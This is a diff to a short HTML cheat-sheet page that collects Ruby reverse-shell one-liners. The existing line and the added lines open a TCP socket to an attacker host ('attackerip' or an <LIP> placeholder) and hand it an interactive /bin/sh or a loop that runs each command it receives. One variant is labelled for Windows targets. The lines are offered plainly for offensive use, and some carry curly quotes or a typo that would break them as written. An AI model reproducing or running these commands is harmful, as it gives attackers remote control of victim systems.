@@ -5,4 +5,14 @@
 <title>Ruby</title>
 </head><body>ruby -rsocket -e'f=TCPSocket.open("&lt;LIP&gt;",&lt;LPORT&gt;).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'<br/>
 <br/>
-ruby: exec "/bin/sh"</body></html>
+ruby: exec "/bin/sh"<br/>
+<br/>
+<br/>
+Longer Ruby reverse shell that does not depend on /bin/sh:<br/>
+ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.printio.read}end’<br/>
+<br/>
+If the target system is running Windows use the following one-liner:<br/>
+ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’<br/>
+<br/>
+ruby -rsocket -e’f=TCPSocket.open(“attackerip”,1234).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’<br/>
+</body></html>
